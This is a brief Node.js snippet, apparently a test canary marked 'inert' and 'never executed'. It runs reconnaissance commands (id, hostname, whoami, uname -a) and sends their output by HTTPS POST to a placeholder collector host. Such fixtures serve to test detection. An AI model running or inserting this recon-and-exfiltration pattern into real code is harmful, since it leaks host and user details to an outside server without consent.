// INERT CANARY - recon chain + outbound POST (never executed).
const { execSync } = require('child_process'); const https = require('https');
const out = execSync('id && hostname && whoami && uname -a').toString();
const req = https.request({ hostname: 'collector.example.invalid', method: 'POST' }); req.end(out);
